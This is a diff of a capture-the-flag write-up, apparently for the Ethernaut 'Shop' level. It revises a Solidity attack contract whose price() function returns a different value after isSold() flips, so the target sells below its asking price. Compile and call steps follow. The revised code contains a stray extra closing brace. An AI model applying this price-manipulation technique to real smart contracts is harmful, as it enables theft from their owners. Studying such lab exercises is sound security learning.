@@ -36,35 +36,39 @@ pragma solidity ^0.8.17;
 
 import "./shop.sol";
 
-contract shopAttack {
+contract shopAttack is Buyer{
     Shop public buyer;
 
     constructor(address _targetaddr) {
         buyer = Shop(_targetaddr);
     }
 
-    function price() external view returns(uint) {
-        if (buyer.isSold()) {
-            return 100;
-        } else {
-            return 0;
-        }
-    }
-
-    function buy() external {
+    function buy() public {
         buyer.buy();
     }
+
+    function price() public view override returns(uint) { 
+        if (buyer.isSold()) {
+            return 0;
+        } else {
+            return 100;
+        }
+
+        // the if statement can be written in a shorter form
+        // return buyer.isSold() ? 0 :100;
+    }
+}
+
+
 }
 ```
 We can compile this using forge
 
-![image](https://github.com/user-attachments/assets/2dbd4a6e-c18f-44e0-ac06-ec1d7d4931a0)
 
 We've successfully compiled the attack contract and we got the contract address to be `0x5A6dD3c52df84Fea9c50f0c6ad9d56656EaA7abf`
 
 Lets start out by calling the `price()` function in the attack contract
 
-![image](https://github.com/user-attachments/assets/73dbf1f5-e8f3-413d-9178-7d47cfedd0ec)
 
 
 
